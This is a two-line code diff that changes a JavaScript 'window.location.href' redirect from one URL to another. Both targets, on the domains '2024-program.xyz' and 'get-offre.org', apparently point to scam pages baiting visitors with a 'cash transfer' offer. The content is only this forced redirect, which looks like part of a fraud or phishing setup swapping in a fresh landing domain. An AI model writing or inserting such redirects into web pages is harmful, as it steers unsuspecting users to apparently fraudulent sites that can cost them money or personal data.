@@ -1,2 +1,2 @@
 
-    window.location.href = "https://2024-program.xyz/75k-fg-cash-transfer.html";
+    window.location.href = "https://get-offre.org/fg.cash.transfer.html";
